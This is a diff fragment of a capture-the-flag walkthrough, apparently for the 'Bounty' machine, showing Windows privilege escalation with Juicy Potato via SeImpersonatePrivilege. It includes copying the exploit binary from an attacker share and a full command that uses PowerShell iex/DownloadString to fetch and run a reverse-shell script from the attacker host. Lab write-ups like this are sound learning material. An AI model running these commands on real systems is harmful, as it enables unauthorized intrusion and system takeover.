@@ -88,12 +88,13 @@ And then I downloaded the juicypotato binary to the target ```TEMP``` directory 
 ```copy \\10.10.14.18\kali\juicy.exe``` </br>
 Now I could use juicy potato to run a process/command for me with the elevated privileges. </br>
 to do that I had to specify a token, a program to launch, com server listen port and CLSID (based on the system OS, it is possible to find it out using ```systeminfo```). </br>
-With systeminfo command I could see that my OS version is Microsoft Windows Server 2008 R2: </br>
+With ```systeminfo``` command I could see that my OS version is Microsoft Windows Server 2008 R2: </br>
 ![systeminfo](images/bounty/systeminfo.png) </br>
 Then In order to specify the CLSID for this system OS, I used this website to find the correct one: </br>
 https://ohpe.it/juicy-potato/CLSID/ </br>
 I picked up this CLSID: ```{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}```, And this is the full command I used: </br>
 ```.\juicy.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.18/reverse.ps1')" -t * </br>
+
 **Vulnerability Exploited:** Juicy Potato Exploit.
 **Vulnerability Explanation:** Juicy Potato is a local privilege escalation tool to exploit Windows service account’s impersonation privileges. </br>
 The tool takes advantage of the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege if enabled on the machine to elevate the local privileges to System. </br>
